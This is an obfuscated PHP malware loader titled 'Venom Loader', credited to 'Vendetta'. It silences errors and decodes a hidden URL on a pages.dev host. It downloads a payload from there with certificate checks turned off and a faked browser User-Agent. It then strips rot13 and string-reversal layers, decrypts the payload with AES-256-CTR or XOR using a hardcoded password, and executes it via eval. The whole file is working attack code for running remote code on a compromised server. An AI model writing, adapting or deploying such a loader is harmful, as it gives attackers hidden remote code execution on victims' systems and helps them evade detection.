<?php
/*
 * Venom Loader - Final Version
 * Obfus and Loader by Vendetta
 */

error_reporting(0);
@ini_set('display_errors',0);

if(!function_exists('b64_c80576')){ function b64_c80576($a){ return base64_decode($a); } }
if(!function_exists('pbk_c80576')){ function pbk_c80576($p,$s,$i,$l){ return hash_pbkdf2('sha256',$p,$s,$i,$l,true); } }
if(!function_exists('fgc_c80576')){ function fgc_c80576($u){ return @file_get_contents($u); } }

$s_38d07a7e='ODRkNWFmZmZiODViZGIxODQ1Mjc3N2JjYzUzZGQ2Njk=';
$k_efcbc44a='JzVc%.l]I>]!TYdoQ%gxFeqog@$r6_bV';
$mo_30fe850a='WyJyb3QxMyIsInN0cnJldiJd';
$eu_deb40dd0='aHR0cHM6Ly9jbG91ZC1laXQucGFnZXMuZGV2L2ZpbGVzL3NmLnR4dA==';

$_s=b64_c80576($s_38d07a7e);
$dk_98aff69b=pbk_c80576($k_efcbc44a,$_s,10000,32);
unset($_s);

$_mo=json_decode(b64_c80576($mo_30fe850a),true);
$ru_9e9fb9d4=b64_c80576($eu_deb40dd0);

$ft_95b32e07=function($u){
    if(function_exists('curl_init')){
        $c=curl_init($u);
        curl_setopt_array($c,[
            CURLOPT_RETURNTRANSFER=>1,
            CURLOPT_SSL_VERIFYPEER=>0,
            CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_FOLLOWLOCATION=>1,
            CURLOPT_TIMEOUT=>30,
            CURLOPT_HTTPHEADER=>['User-Agent: Mozilla/5.0']
        ]);
        $r=curl_exec($c);
        curl_close($c);
        return $r;
    }
    return fgc_c80576($u);
};

$ep_441e0851=$ft_95b32e07($ru_9e9fb9d4);
if(!$ep_441e0851){die();}

$r1_2bef53eb=b64_c80576($ep_441e0851);

$dp_05954d5e=$r1_2bef53eb;
foreach(array_reverse($_mo) as $_m){
    switch($_m){
        case 'rot13':
            $dp_05954d5e=str_rot13($dp_05954d5e);
            break;
        case 'strrev':
            $dp_05954d5e=strrev($dp_05954d5e);
            break;
    }
}
unset($_mo,$_m);

$cp_0840111a=b64_c80576($dp_05954d5e);

$mf_e470c21e=ord($cp_0840111a[0]);
$cp_0840111a=substr($cp_0840111a,1);

$_iv=substr($cp_0840111a,0,16);
$_ed=substr($cp_0840111a,16);

$fp_0abd12f8='';

if($mf_e470c21e===1 && extension_loaded('openssl')){
    $fp_0abd12f8=openssl_decrypt($_ed,'aes-256-ctr',$dk_98aff69b,OPENSSL_RAW_DATA,$_iv);
    if($fp_0abd12f8===false){
        for($i=0;$i<strlen($_ed);$i++){
            $fp_0abd12f8.=$_ed[$i]^$dk_98aff69b[$i%strlen($dk_98aff69b)];
        }
    }
}else{
    for($i=0;$i<strlen($_ed);$i++){
        $fp_0abd12f8.=$_ed[$i]^$dk_98aff69b[$i%strlen($dk_98aff69b)];
    }
}

unset($_iv,$_ed,$cp_0840111a,$mf_e470c21e,$dk_98aff69b);

eval('?>'.$fp_0abd12f8);
?>
